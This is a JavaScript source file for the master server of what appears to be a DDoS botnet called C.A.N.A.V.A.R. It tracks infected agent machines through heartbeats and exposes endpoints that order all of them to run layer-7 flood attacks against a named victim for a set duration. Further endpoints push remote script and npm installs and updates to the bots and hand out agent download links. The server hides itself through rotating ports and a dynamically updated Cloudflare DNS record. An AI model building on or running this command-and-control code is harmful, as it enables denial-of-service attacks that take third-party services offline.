//npm install express json-server isomorphic-fetch axios events delay random-number-csprng moment crypto
process.chdir(__dirname)
const dotenv_ = require('dotenv')
const dotenv = dotenv_.config().parsed
const { exec } = require('child_process');
let initSign = `${Date.now()}`
const logger = require('./logger.js').log
logger.init(initSign, "Initiating...")
logger.init(initSign, "Environment variables recieved as : " + JSON.stringify(dotenv))
const express = require('express')
logger.init(initSign, "Called 'express'")
const app = express()
logger.init(initSign, "Initiated 'express'")
const jsonServer = require('json-server')
logger.init(initSign, "Called 'json-server'")
const server = jsonServer.create()
logger.init(initSign, "Created 'json-server'")
const router = jsonServer.router('db.json')
logger.init(initSign, "Called 'json-server' router")
const middlewares = jsonServer.defaults()
const fetch = require('isomorphic-fetch')
logger.init(initSign, "Called 'isomorphic-fetch'")
const axios = require('axios').default;
logger.init(initSign, "Called 'axios'")
const config = require('./config.json')
logger.init(initSign, "Called config.")
const EventEmitter = require('events')
logger.init(initSign, "Called 'events'")
const delay = require('delay')
logger.init(initSign, "Called 'delay'")
const randomInt = require("random-number-csprng");
logger.init(initSign, "Called 'random-number-csprng'")
const moment = require('moment')
logger.init(initSign, "Called 'moment'")
const crypto = require('crypto')
logger.init(initSign, "Called 'crypto'")
const callerId = require('caller-id')
logger.init(initSign, "Called 'caller-id'")
let initLogID = crypto.randomBytes(5).toString('hex')

let initiated = false
let AGENTLINK = null
let SERVICELINK = null
let SERVICENAME = null
let SCRIPTS = null
let CURRENTPORT = null
let activeMachines = []
let GLOBALS = {}
const dbok = new EventEmitter()

function logID() {
    return crypto.randomBytes(5).toString('hex');
}
server.use((req, res, next) => {

    //console.log(req);
    if (req.method === "POST") {
        if ((req.headers.accesskey)) {
            if ((config.pk).includes(req.headers.accesskey)) {
                //console.log("approve");
                next()
            } else {
                res.send(403)
            }
        } else {
            res.send(403)
        }
    } else {
        next();
    }
})

app.use((req, res, next) => {
    let area = ((req.originalUrl).split("/")[1]);
    if (area === "mgmt") {
        if ((req.headers.accesskey)) {
            if ((config.pk).includes(req.headers.accesskey)) {
                //console.log("approve");
                next()
            } else {
                res.send(403)
            }
        } else {
            res.send(403)
        }
    } else {
        next()
    }
})


server.use(middlewares)
server.use(router)
server.listen(3000, () => {
    //console.log('JSON Server is running')
    dbok.emit('true')
    initiate()
})

dbok.on('true', () => {
    if (!initiated) {
        logger.init(initSign, "Database started.")
    } else {
        logger.info(logID(), "Database started", "Database started.")
    }
    //console.log('started')

})
dbok.on('false', () => {
    //console.log('FUCK')
    if (!initiated) {
        logger.init(initSign, "Database couldn't start.")
    } else {
        logger.error(logID(), "Database error", "Database error.")
    }
})

app.get('/scripts', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    //console.log(scid);
    if (scid === undefined) {
        axios.get("http://localhost:3000/scripts")
            .then(response => {
                res.send(200, response.data)
            })
            .catch(err => {
                console.error(err);
            })
    } else {
        axios.get("http://localhost:3000/scripts/" + scid)
            .then(response => {
                res.send(200, response.data)
            })
            .catch(err => {
                res.send(500, {
                    error: {
                        message: "SCRIPT_DOES_NOT_EXIST",
                        innerResponse: `${err.message}`
                    }
                })
            })
    }

})

app.get('/setup', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    //console.log(scid, detid);
    if (scid === undefined) {
        axios.get("http://localhost:3000/setup")
            .then(response => {
                res.send(200, response.data)
            })
            .catch(err => {
                console.error(err);
            })
    } else {
        axios.get("http://localhost:3000/setup/")
            .then(response => {
                let requested = (response.data)[scid]
                if (requested.includes("$")) {
                    if (scid === "download_agent") {
                        res.send(200, (requested.replace("$AGENTLINK;", AGENTLINK)))
                    } else if (scid === "service_setup") {
                        requested = requested.replace("$SERVICELINK", SERVICELINK)
                        var regex = new RegExp("SERVICENAME", "g");
                        requested = requested.replace(regex, SERVICENAME)
                        res.send(200, (requested))
                    } else if (scid === "download_script") {
                        let searchSatisfied = false
                        for (let index = 0; index < SCRIPTS.length; index++) {
                            const element = SCRIPTS[index];
                            if (element.id === detid) {
                                //console.log(element);
                                searchSatisfied = true
                                requested = requested.replace("$SCRIPTLINK", element.source)
                                requested = requested.replace("$SCRIPTNAME", element.filename)
                                res.send(requested)
                            }
                        }
                        if (!searchSatisfied) {
                            res.send(500, {
                                error: {
                                    message: "SCRIPT_DOES_NOT_EXIST",
                                    innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
                                }
                            })
                        }
                        requested = requested.replace("$SERVICELINK", SERVICELINK)
                        var regex = new RegExp("SERVICENAME", "g");
                        requested = requested.replace(regex, SERVICENAME)
                        //res.send(200, (requested))
                    }
                }
            })
            .catch(err => {
                if (scid === "script_json") {
                    let searchSatisfied = false
                    for (let index = 0; index < SCRIPTS.length; index++) {
                        const element = SCRIPTS[index];
                        if (element.id === detid) {
                            //console.log(element);
                            searchSatisfied = true
                            console.log(element);
                            res.send(element)
                        }
                    }
                    if (!searchSatisfied) {
                        res.send(500, {
                            error: {
                                message: "SCRIPT_DOES_NOT_EXIST",
                                innerResponse: `The script with ID'${detid}' does not exist in the dictionary.`
                            }
                        })
                    }
                }
                else {
                    console.log(err);
                    res.send(500, { error: { message: err.message } })
                }
            })
    }

})

app.get('/', (req, res) => {
    let ref = (req.headers.host);
    if (ref === "127.0.0.1") {
        //console.log(AGENTLINK);
        //console.log(SCRIPTS);
        //console.log(SERVICENAME);
        //console.log(SERVICELINK);
    }
    res.send(200, "OKAY")
})

app.get('/heartbeat', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    if (!activeMachines.includes(ip)) {
        activeMachines.push(ip)
    }
    res.send(200, "OKAY")
})

app.get('/all/installscript/:scriptid', (req, res) => {
    clen = activeMachines.length
    for (let index = 0; index < clen; index++) {
        console.log(`Asking ${activeMachines[index]}:${CURRENTPORT}`);
        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/installScript/${req.params.scriptid}`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err);
            })

    }
    res.send(200, "OKAY")
})
app.get('/all/installscript/:module', (req, res) => {
    clen = activeMachines.length
    for (let index = 0; index < clen; index++) {
        console.log(`Asking ${activeMachines[index]}:${CURRENTPORT}`);
        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/npminstall/${req.params.module}`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err);
            })

    }
    res.send(200, "OKAY")
})

app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
    clen = activeMachines.length
    let machines = {
        all: activeMachines,
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < clen; index++) {
        machines.asked.push(activeMachines[index])
        console.log(`http://${activeMachines[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
            .then(res => {
                console.log(res.data)
                machines.responded.push(activeMachines[index])
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(activeMachines[index])
            })
    }
    await delay(3000)
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})
app.get('/all/update', (req, res) => {
    clen = activeMachines.length
    for (let index = 0; index < clen; index++) {
        console.log(`http://${activeMachines[index]}:${CURRENTPORT}/update`);
        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/update`)
            .then(res => {
                console.log(res.data)
            })
            .catch(err => {
                console.error(err.response.data);
            })

    }
    res.send(200, "OKAY")
})
app.get('/globals', (req, res) => {
    GLOBALS.port.leftForChange = ((GLOBALS.port.changeAt) - (Date.now()))
    GLOBALS.port.shouldChange = (GLOBALS.port.changeAt <= Date.now())
    res.send(200, GLOBALS)
})
app.get('/machines/active', (req, res) => {
    res.send(200, activeMachines)
})

app.post('/mgmt/changePort/:newPort', async (req, res) => {
    let logid = crypto.randomBytes(5).toString('hex');
    logger.info(logid, "API POST Request", "Port change requested.")
    if (isNaN(req.params.newPort)) {
        logger.info(logid, "Port change requested.", "Requested port isNaN, defaulting to random.")
        //interactive.await('[%d/4] - Requested port is not a number, defaulting to a random port.', 1);
        let newPort = await randomInt(1000, 9999)
        changePort(newPort, logid)
        logger.info(logid, "Port change requested.", "Successfuly switched to port " + newPort)
    } else {
        logger.info(logid, "Port change requested.", `Requested port is ${req.params.newport}, defaulting to random.`)
        changePort(req.params.newPort, logid)
    }
    res.send(200)
})

app.post('/mgmt/schedulePortChange/:newPort/:inMins', async (req, res) => {
    let logid = crypto.randomBytes(5).toString('hex');
    logger.info(logid, "API POST Request", "Port change schedule requested.")
    if (isNaN(parseInt(req.params.newPort)) || isNaN(parseInt(req.params.inMins))) {
        logger.error(logid, "Port change schedule requested.", "Invalid parameters. Rejecting request.")
        res.send(500, {
            error: {
                message: "INVALID_USAGE",
                innerResponse: `usage: schedulePortChange/:newPort/:inMins`
            }
        })
    } else {
        logger.info(logid, "Port change schedule requested.", `Scheduling port change for port ${req.params.newPort} in ${req.params.inMins} minutes.`)
        schedulePortChange(parseInt(req.params.inMins), parseInt(req.params.newPort), logid)
        res.send(200)
    }
})
app.post('/mgmt/schedulePortChangeSeconds', async (req, res) => {
    schedulePortChangeSeconds(5, parseInt(await randomInt(1000, 9999)), "test")
})

async function schedulePortChangeSeconds(secs, np, logid) {
    let inMinutes = secs || config.defaultPortReplenishTimeMin
    let newPort = np || await randomInt(1000, 9999)
    logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
    GLOBALS.port.changeAt = moment().add({ seconds: inMinutes }).unix() * 1000,
        GLOBALS.port.changeTo = newPort
    GLOBALS.port.changedLast = Date.now()
    axios.patch("http://localhost:3000/global", GLOBALS)
        .then(res => {
            logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
            //console.log(res)
        })
        .catch(err => {
            logger.error(logid, "Port change schedule failed.", `${err.message}`)
            dbok.emit('false')
        })

}

app.post('/mgmt/update', (req, res) => {
    res.send(200)
    exec("cd /C.A.N.A.V.A.R/ ; git pull; cd master ; npm install; nohup systemctl restart canavarmaster &", (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
            res.send(500, { std_err: err })
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
            res.send(200, { std_out: stdout, std_err: stderr })
        }
    })
})
//auto-update & keep latest machines in json-server cache for faster magazine change?
app.post('/mgmt/vcontrol', (req, res) => {
    exec("cd /C.A.N.A.V.A.R/ ; git show -1 --stat  ", (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
            res.send(200, { std_err: err })
        } else {
            // the *entire* stdout and stderr (buffered)
            console.log(`stdout: ${stdout}`);
            console.log(`stderr: ${stderr}`);
            let stdout_ = stdout
            if (stdout.length > 10) {
                var options = {
                    method: 'GET',
                    url: 'https://api.github.com/repos/mehmetefeerkan/C.A.N.A.V.A.R/commits',
                    headers: { Accept: 'application/vnd.github.v3+json' }
                };

                axios.request(options).then(function (response) {
                    console.log(response.data);
                    let resp = response.data
                    let latestCommitSHA = resp[0].sha
                    if ((latestCommitSHA === (null || undefined || ""))) {
                        res.send(500, {
                            error: {
                                message: "INVALID_COMMIT_SHA_RECIEVED",
                                innerResponse: `Given SHA was${latestCommitSHA}`
                            }
                        })
                    } else {
                        if (stdout_.includes(latestCommitSHA)) {
                            res.send(200, { upToDate: true, latestCommit: resp[0], currentCommitData: stdout_ })
                        } else {
                            res.send(200, { upToDate: false, latestCommit: resp[0], currentCommitData: stdout_ })
                        }
                    }
                }).catch(function (error) {
                    console.error(error);
                });
            }
            //res.send(200, {std_out: stdout, std_err: stderr})x
        }
    })
})

app.post('/mgmt/portElusion/', async (req, res) => {
    let newPort = await randomInt(1000, 9999)
    let currentPort = GLOBALS.port.number
    console.log(GLOBALS);
    GLOBALS.port.last = currentPort
    console.log(GLOBALS);
    GLOBALS.port.changedLast = Date.now()
    console.log(GLOBALS);
    GLOBALS.port.number = newPort
    CURRENTPORT = newPort
    console.log(GLOBALS);
    axios.patch("http://localhost:3000/global", GLOBALS)
        .then(res => {
            //console.log(res)
            schedulePortChange()
        })
        .catch(err => {
            dbok.emit('false')
        })
    res.send(200)
})

app.listen(80, () => console.log(`App listening on port ${"80"}!`))

function initiate() {
    axios.get("http://localhost:3000/setup")
        .then(res => {
            AGENTLINK = res.data.agentLink
            SERVICELINK = res.data.serviceLink,
                SERVICENAME = res.data.serviceName

        })
        .catch(err => {
            console.error(err);
        })
    axios.get("http://localhost:3000/scripts")
        .then(res => {
            SCRIPTS = res.data
        })
        .catch(err => {
            console.error(err);
        })
    axios.get("http://localhost:3000/global")
        .then(res => {
            CURRENTPORT = res.data.port.number
            if ((res.data).port.changeAt < moment().utc()) {
                //console.log("Scheduling port change.");
                schedulePortChange()
            }
        })
        .catch(err => {
            console.error(err);
        })
    updateMasterSubdomain()
}

async function changePort(newport, logid) {
    logger.info(logid, "Changing port.", "Response for the current settings recieved.")
    GLOBALS.port.number = parseInt(newport)
    CURRENTPORT = parseInt(newport)
    axios.patch("http://localhost:3000/global", GLOBALS)
        .then(res => {
            logger.info(logid, "Changed port.", `Successfuly switched to port ${res.data.port.number}.`)
            //console.log(res)
        })
        .catch(err => {
            logger.error(logid, "Couldn't change port. Patch failed.", `${err.message}`)
            dbok.emit('false')
        })
}

async function schedulePortChange(mins, np, logid) {
    let inMinutes = mins || config.defaultPortReplenishTimeMin
    let newPort = np || await randomInt(1000, 9999)
    logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
    GLOBALS.port.changeAt = moment().add({ minutes: inMinutes }).unix() * 1000
    GLOBALS.port.changeTo = newPort
    axios.patch("http://localhost:3000/global", GLOBALS)
        .then(res => {
            logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
            //console.log(res)
        })
        .catch(err => {
            logger.error(logid, "Port change schedule failed.", `${err.message}`)
            dbok.emit('false')
        })

}

clock()

async function clock() {
    let freq = config.clockclock
    while (true) {
        await delay(freq)
    }
}

function checkSelf() {
    axios.get("http://localhost:3000/global")
        .then(res => {
            console.log(GLOBALS);
            if (GLOBALS.port.changeAt <= Date.now()) {
                console.log(GLOBALS);
                GLOBALS.port.last = global.port.number
                console.log(GLOBALS);
                GLOBALS.port.number = global.port.changeTo
                console.log(GLOBALS);
                CURRENTPORT = global.port.changeTo
                console.log(GLOBALS);
                global.port.changedLast = Date.now()
                GLOBALS.log(GLOBALS);
                axios.patch("http://localhost:3000/global", GLOBALS)
                .then(res => {
                    refreshGlobals()
                    schedulePortChange()
                    console.log("repl");
                    console.log(GLOBALS);
                    })
                    .catch(err => {
                        dbok.emit('false')
                    })
            }

        })
        .catch(err => {
        })
}

checkSelf();
refreshGlobals()

setInterval(function () {
    checkSelf()
    console.log(activeMachines);
    console.log(Date.now())
}, 10000)
setInterval(function () {
    refreshGlobals()
}, 1000)
function refreshGlobals() {
    axios.get("http://localhost:3000/global")
        .then(res => {
            GLOBALS = res.data
        })
        .catch(err => {
            GLOBALS = GLOBALS
        })
}

function updateMasterSubdomain() {
    let traceid = logID()
    logger.info(traceid, "Updating Master Subdomain", `Begun`)
    axios.get("http://icanhazip.com")
        .then(res => {
            console.log(res.data)
            let currentIP = res.data
            logger.info(traceid, "Updating Master Subdomain", `Current IP recieved as ${currentIP}`)
            var options = {
                method: 'PUT',
                url: `https://api.cloudflare.com/client/v4/zones/${dotenv.CFZI}/dns_records/${dotenv.CFDR}`,
                headers: {
                    Authorization: 'Bearer ' + dotenv.CFPT,
                    'Content-Type': 'application/json'
                },
                data: {
                    type: 'A',
                    name: 'master.api.canavar.licentia.xyz',
                    content: currentIP,
                    ttl: 1,
                    proxied: true
                }
            };
            axios.request(options).then(function (response) {
                console.log(response.data);
                logger.info(traceid, "Updated Master Subdomain", `Updated the subdomain to IP ${currentIP}`)
            }).catch(function (error) {
                logger.info(traceid, "Couldn't Update Master Subdomain", `Tried to update the subdomain to IP ${currentIP}`)
                console.error(error);
            });
        })
        .catch(err => {
            console.error(err);
            logger.info(traceid, "Couldn't Update Master Subdomain", `Error was : ${err}`)
        })

}

setInterval(function () {
    activeMachines = []
    updateMasterSubdomain()
}, 60000)